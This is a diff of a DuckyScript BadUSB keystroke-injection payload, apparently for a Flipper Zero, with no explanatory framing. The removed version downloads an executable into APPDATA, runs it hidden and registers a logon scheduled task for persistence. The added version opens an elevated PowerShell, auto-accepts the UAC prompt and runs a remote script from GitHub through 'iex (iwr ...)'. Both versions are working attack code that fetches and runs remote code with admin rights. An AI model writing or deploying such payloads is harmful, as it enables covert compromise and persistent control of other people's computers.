@@ -1,29 +1,10 @@
-REM Open Run dialog
 GUI r
-DELAY 500
-
-REM Type powershell
-STRING powershell
 DELAY 200
-
-REM Press Ctrl+Shift+Enter to open PowerShell as admin
+STRING powershell
 CTRL-SHIFT ENTER
 DELAY 1500
-
-REM Confirm UAC prompt (Alt+Y)
 ALT y
-DELAY 1500
-STRING Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/WinUman.exe' -OutFile $env:APPDATA\WinUman.exe;
+DELAY 1000
+STRING iex (iwr -UseBasicParsing "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/refs/heads/main/PWNED.ps1"); exit
 DELAY 200
-STRING Start-Process -FilePath $env:APPDATA\WinUman.exe -WindowStyle Hidden;
-DELAY 200
-STRING $action = New-ScheduledTaskAction -Execute $env:APPDATA\WinUman.exe;
-DELAY 200
-STRING $trigger = New-ScheduledTaskTrigger -AtLogOn;
-DELAY 200
-STRING Register-ScheduledTask -TaskName 'WinUmanUpdater' -Action $action -Trigger $trigger -RunLevel Highest;
-DELAY 200
-STRING Write-Host 'Setup complete. Scheduled task created.'
-DELAY 200
-STRING "
 ENTER
